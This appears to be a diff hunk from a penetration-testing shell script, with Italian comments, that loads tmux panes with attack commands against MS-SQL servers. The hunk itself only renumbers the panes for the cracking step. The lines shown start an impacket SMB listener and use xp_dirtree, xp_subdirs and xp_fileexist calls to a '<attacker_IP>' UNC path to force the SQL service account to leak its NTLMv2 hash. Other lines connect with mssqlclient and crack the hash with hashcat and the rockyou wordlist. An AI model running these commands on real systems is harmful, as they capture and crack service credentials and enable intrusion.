@@ -2498,8 +2498,8 @@ tmux send-keys -t PT:27.10 "MS-SQL get mssql account HASH: activate SMB listener
 tmux send-keys -t PT:27.10 "sudo impacket-smbserver share ./ -smb2support"
 tmux send-keys -t PT:27.11 "printf \"\n# MS-SQL get mssql account HASH: activate SMB call from mssql server\n# SQL> xp_dirtree '\\<attacker_IP>\any\thing'\n# SQL> exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'\n# SQL> exec master..xp_subdirs '\\<attacker_IP>\anything\'\n# SQL> exec master..xp_fileexist '\\<attacker_IP>\anything\'\n\n\" " Enter
 tmux send-keys -t PT:27.11 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
-tmux send-keys -t PT:27.10 "MS-SQL get mssql account HASH: crack mssal account HASH" Enter
-tmux send-keys -t PT:27.10 "hashcat -m 5600 sql.hash.ntlmv2 /usr/share/wordlist/rockyou.txt"
+tmux send-keys -t PT:27.12 "MS-SQL get mssql account HASH: crack mssal account HASH" Enter
+tmux send-keys -t PT:27.12 "hashcat -m 5600 sql.hash.ntlmv2 /usr/share/wordlist/rockyou.txt"
 cd $folderProject
 
 # Attivazione della modalità interattiva
